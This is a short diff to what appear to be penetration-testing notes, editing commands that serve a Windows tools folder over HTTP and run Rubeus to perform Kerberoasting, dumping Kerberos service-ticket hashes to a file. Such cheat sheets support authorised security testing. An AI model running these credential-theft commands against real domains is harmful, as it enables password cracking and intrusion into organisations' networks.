@@ -1,5 +1,5 @@
 ```
-cd ~/Desktop/Tools/Windows && python -m http.server 80
+python -m http.server 80 --directory ~/Desktop/Tools/Windows
 ```
 
 ```dataviewjs
@@ -11,12 +11,12 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 Dot Source
 ```powershell
-. C:\Users\Public\Rubeus.exe
+. .\Rubeus.exe
 ```
 
 Kerberoasting
 ```
-.\\Rubeus.exe kerberoast /outfile:kerberoast.hashes
+.\Rubeus.exe kerberoast /outfile:kerberoast.hashes
 ```
 
 ```
